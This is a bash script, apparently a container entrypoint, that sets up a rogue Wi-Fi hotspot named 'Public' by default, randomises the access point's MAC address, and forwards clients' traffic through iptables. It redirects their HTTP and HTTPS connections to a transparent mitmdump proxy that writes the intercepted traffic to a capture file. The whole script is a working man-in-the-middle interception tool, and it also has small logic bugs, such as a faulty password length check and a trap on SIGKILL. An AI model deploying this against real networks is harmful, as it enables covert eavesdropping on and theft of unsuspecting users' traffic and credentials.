#!/bin/bash

AP_IFACE="${AP_IFACE:-wlan0}"
INTERNET_IFACE="${INTERNET_IFACE:-eth0}"
SSID="${SSID:-Public}"
CAPTURE_FILE="${CAPTURE_FILE:-/root/data/http-traffic.cap}"
MAC="${MAC:-random}"

# SIGTERM-handler
term_handler() {

  # remove iptable entries
  iptables -t nat -D POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
  iptables -D FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
  iptables -D FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT

  /etc/init.d/dnsmasq stop
  /etc/init.d/hostapd stop
  /etc/init.d/dbus stop

  kill $MITMDUMP_PID
  kill -TERM "$CHILD" 2> /dev/null

  echo "received shutdown signal, exiting."
}

# spoof MAC address
if [ "$MAC" != "unchanged" ] ; then
  ifconfig "$AP_IFACE" down
  if [ "$MAC" == "random" ] ; then
    echo "using random MAC address"
    macchanger -A "$AP_IFACE"
  else
    echo "setting MAC address to $MAC"
    macchanger --mac "$MAC" "$AP_IFACE"
  fi
  if [ ! $? ] ; then
    echo "Failed to change MAC address, aborting."
    exit 1
  fi
  ifconfig "$AP_IFACE" up
fi

ifconfig "$AP_IFACE" 10.0.0.1/24

# configure WPA password if provided
if [ ! -z "$PASSWORD" ]; then

  # password length check
  if [ ! ${#PASSWORD} -ge 8 ] && [ ${#PASSWORD} -le 63 ]; then
    echo "PASSWORD must be between 8 and 63 characters"
    echo "password '$PASSWORD' has length: ${#PASSWORD}, exiting."
    exit 1
  fi

  # uncomment WPA2 auth stuff in hostapd.conf
  # replace the password with $PASSWORD
  sed -i 's/#//' /etc/hostapd/hostapd.conf
  sed -i "s/wpa_passphrase=.*/wpa_passphrase=$PASSWORD/g" /etc/hostapd/hostapd.conf
fi

sed -i "s/^ssid=.*/ssid=$SSID/g" /etc/hostapd/hostapd.conf
sed -i "s/interface=.*/interface=$AP_IFACE/g" /etc/hostapd/hostapd.conf
sed -i "s/interface=.*/interface=$AP_IFACE/g" /etc/dnsmasq.conf

/etc/init.d/dbus start
/etc/init.d/dnsmasq start
/etc/init.d/hostapd start

echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables entries to setup AP network
# -C checks if rule exists, -A adds, and -D deletes
iptables -t nat -C POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
if [ ! $? -eq 0 ] ; then
    iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
fi
iptables -C FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
if [ ! $? -eq 0 ] ; then
    iptables -A FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
fi
iptables -C FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
if [ ! $? -eq 0 ] ; then
    iptables -A FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
fi

# iptables rule to forward all traffic on router port 80 to 1337
# where mitmproxy will be listening for it
iptables -t nat -C PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 1337
iptables -t nat -C PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 1337
if [ ! $? -eq 0 ] ; then
  iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 1337
  iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 1337
fi

# setup handlers
trap term_handler SIGTERM
trap term_handler SIGKILL

# start mitmproxy in the background, but keep its output in this session
mitmdump --mode transparent --set confdir=/certs --set keep_host_header=true -s /scripts/proxy.py --listen-host 0.0.0.0 -p 1337 -w "$CAPTURE_FILE" &
MITMDUMP_PID=$!

# wait forever
sleep infinity &
CHILD=$!
wait "$CHILD"